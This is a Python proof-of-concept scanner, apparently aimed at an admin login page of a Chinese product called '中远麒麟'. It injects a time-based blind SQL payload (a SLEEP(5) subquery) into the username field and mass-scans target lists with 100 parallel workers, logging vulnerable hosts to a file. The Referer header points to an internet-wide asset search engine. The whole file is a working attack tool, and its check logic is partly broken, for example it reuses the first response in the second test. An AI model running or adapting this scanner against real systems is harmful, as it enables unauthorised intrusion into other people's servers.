import time
import requests, argparse,sys, re
from multiprocessing import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """sql注入"""
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟 poc&exp")
    parser.add_argument('-u', '--url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', type=str, help='File Path')
    args = parser.parse_args()
    # 如果提供了url而没有提供文件路径
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件路径而没有提供url
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUsage: python3 {sys.argv[0]} -h\n")

# 主函数
# 漏洞检测函数
def poc(target):
    url = target + "/admin.php?controller=admin_commonuser"
    headers = {
        "Cookie": "PHPSESSID=4638581ea38250ea39ad8b15951634ed",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://fofa.info/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "77"
    }
    data = {
        "username":"admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm",
        "follow_redirects": "true",
        "matches": "(code.eq(\"200\") && time.gt(\"5\") && time.lt(\"10\"))"
    }
    data1 = {
        "username":"admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm",
        "follow_redirects": "true",
        "matches": "(code.eq(\"200\") && time.lt(\"5\")"
    }
    try:
        res = requests.get(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and "result" in res.text and "username and password does not match" in res.text:
            res1 =requests.get(url=url,headers=headers,data=data1,verify=False,timeout=10)
            if res1.status_code == 200 and "result" in res.text and "username and password does not match" in res1.text:
                print("[+] 这个url存在SQL注入" + target)
                with open('../sis2405/zyql.txt', 'a', encoding='utf-8') as f:
                    f.write(target + "存在SQL注入\n")
        else:
            print("[-] 这个url不存在SQL注入")
    except:
        pass


if __name__ == '__main__':
    main()
